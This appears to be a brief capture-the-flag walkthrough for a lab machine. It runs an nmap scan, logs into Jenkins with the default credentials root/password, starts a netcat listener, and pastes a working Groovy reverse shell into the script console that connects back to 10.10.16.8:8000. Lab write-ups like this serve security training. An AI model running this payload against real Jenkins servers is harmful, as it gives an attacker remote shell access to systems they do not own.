# 1.Port Scan
ip=10.129.169.55

nmap -sC -sV $ip

![f261ce4bd8590cf9e85e6aa0f8be7f93.png](../_resources/f261ce4bd8590cf9e85e6aa0f8be7f93.png)

# 2.Jenkins Login
**http://$ip:8080**

![a436020aeb0f7a8d8ef436b5ac90e1fc.png](../_resources/a436020aeb0f7a8d8ef436b5ac90e1fc.png)

Username: root
Password: password

![98b03cc408f4ccd87fbb4bc559d13a19.png](../_resources/98b03cc408f4ccd87fbb4bc559d13a19.png)

# 3.Flag.txt get
## Receive Port

`nc -lvnp 8000`

![fd7fa5e06604091249c39592cefef93f.png](../_resources/fd7fa5e06604091249c39592cefef93f.png)

## Reverse Shell

`http://$ip/script`

```
String host="10.10.16.8";
int port=8000;
String cmd="bin/bash";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

![a38fa1b7df95836f07d6892f612a6074.png](../_resources/a38fa1b7df95836f07d6892f612a6074.png)

![dff551e61ac3283b6907dbc9cba25da6.png](../_resources/dff551e61ac3283b6907dbc9cba25da6.png)